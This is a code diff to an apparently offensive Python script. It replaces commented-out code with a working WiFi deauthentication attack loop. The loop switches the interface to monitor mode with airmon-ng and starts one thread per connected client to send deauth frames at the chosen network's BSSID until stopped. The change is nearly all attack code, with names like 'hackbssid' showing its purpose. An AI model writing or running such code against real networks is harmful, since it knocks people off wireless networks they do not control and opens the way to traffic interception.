@@ -257,18 +257,19 @@ def main():
     hackbssid = wifi_network_choice["BSSID"]
     hackchannel = wifi_network_choice["channel"].strip()
     clients_to_deauth = get_clients(hackbssid, hackchannel, inter)
-    
-    # threads_started = []
 
-    # subprocess.run(["airmon-ng", "start", inter, hackchannel])
-    # try:
-       
-    #                 if item not in threads_started:
-    #                     threads_started.append(item)
-    #                     t = threading.Thread(target=deauth_attack, args=[hackbssid, item, inter], daemon=True)
-    #                     t.start()
-    # except KeyboardInterrupt:
-    #     print("\nStopping Deauth")
+    subprocess.run(["airmon-ng", "start", inter, hackchannel])
+    
+    threads = []
+    for client in clients_to_deauth:
+        t = threading.Thread(target=deauth_attack, args=[hackbssid, client, inter], daemon=True)
+        t.start()
+        threads.append(t)
+    try:
+        while True:
+            time.sleep(0.1)
+    except KeyboardInterrupt:
+        print(f"\n{purple}[#]{reset} Stopping Deauth..")
 
     restore_managed_mode(inter)
 
